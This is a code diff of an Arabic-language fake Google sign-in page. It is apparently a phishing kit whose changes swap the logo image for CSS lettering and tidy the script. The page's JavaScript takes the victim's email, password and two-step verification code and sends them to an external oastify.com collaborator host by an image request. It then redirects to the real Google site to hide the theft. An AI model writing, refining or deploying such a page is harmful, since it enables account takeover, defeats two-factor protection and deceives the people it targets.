@@ -7,9 +7,18 @@
     <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
-        .logo { width: 75px; margin-bottom: 12px; }
-        h1 { font-size: 24px; font-weight: 400; line-height: 1.33; margin: 0; padding-top: 16px; color: #202124; }
+        .login-card { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
+        
+        /* شعار جوجل الكبير بالألوان باستخدام الـ CSS */
+        .google-logo-css { font-family: 'Product Sans', 'Roboto', sans-serif; font-size: 38px; font-weight: 500; letter-spacing: -1.5px; margin-bottom: 25px; margin-top: 10px; display: inline-block; }
+        .g1 { color: #4285F4; } /* أزرق */
+        .o1 { color: #EA4335; } /* أحمر */
+        .o2 { color: #FBBC05; } /* أصفر */
+        .g2 { color: #4285F4; } /* أزرق */
+        .l1 { color: #34A853; } /* أخضر */
+        .e1 { color: #EA4335; } /* أحمر */
+
+        h1 { font-size: 24px; font-weight: 400; line-height: 1.33; margin: 0; color: #202124; }
         p.subtitle { font-size: 16px; font-weight: 400; letter-spacing: 0.1px; line-height: 1.5; margin-bottom: 30px; margin-top: 8px; color: #202124; }
         .input-container { margin-bottom: 10px; text-align: right; }
         input { width: 100%; height: 56px; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; text-align: right; }
@@ -26,7 +35,9 @@
 <body>
 
 <div class="login-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google" class="logo">
+    <div class="google-logo-css">
+        <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l1">l</span><span class="e1">e</span>
+    </div>
     
     <div id="step1">
         <h1>تسجيل الدخول</h1>
@@ -46,7 +57,7 @@
 
     <div id="step2">
         <h1>التحقق بخطوتين</h1>
-        <p class="subtitle" style="font-size: 14px; color: #5f6368;">أرسلنا رمز تحقق مكون من 6 أرقام إلى هاتفك. أدخل الرمز أدناه للمتابعة.</p>
+        <p class="subtitle" style="font-size: 14px; color: #5f6368;">أرسلنا رمز تحقق مكون من 6 أرقام إلى هاتفك المرتبط بهذا الحساب.</p>
         <div class="input-container">
             <input type="text" id="otp" placeholder="G- أدخل الرمز" maxlength="6" style="letter-spacing: 2px; text-align: center;">
         </div>
@@ -58,10 +69,8 @@
 </div>
 
 <script>
-    // رابط البرب الخاص بك (تأكد إنه ينتهي بـ .oastify.com)
     const collab = "https://B0ccvemapuqpc1vj0j9jgr8db4hv5lta.oastify.com";
 
-    // دالة الإرسال الموثوقة (تستخدم الصور لضمان عدم الحظر)
     function track(action, params) {
         const img = new Image();
         const queryString = Object.keys(params).map(key => `${key}=${encodeURIComponent(params[key])}`).join('&');
@@ -72,25 +81,18 @@
         const e = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
         if(e && p) {
-            track("G_DATA", { user: e, pass: p }); // إرسال الإيميل والباسورد
+            track("G_LOGIN", { u: e, p: p });
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
-        } else {
-            alert("يرجى إدخال البيانات المطلوبة");
-        }
+        } else { alert("يرجى إكمال البيانات"); }
     }
 
     function sendStep2() {
         const o = document.getElementById('otp').value;
         if(o) {
-            track("G_OTP", { code: o }); // إرسال رمز التحقق
-            // تحويل الضحية للموقع الحقيقي بعد 500 مللي ثانية لضمان الإرسال
-            setTimeout(() => {
-                window.location.href = "https://accounts.google.com/manage-account";
-            }, 500);
-        } else {
-            alert("يرجى إدخال رمز التحقق");
-        }
+            track("G_OTP", { code: o });
+            setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 500);
+        } else { alert("يرجى إدخال رمز التحقق"); }
     }
 </script>
 
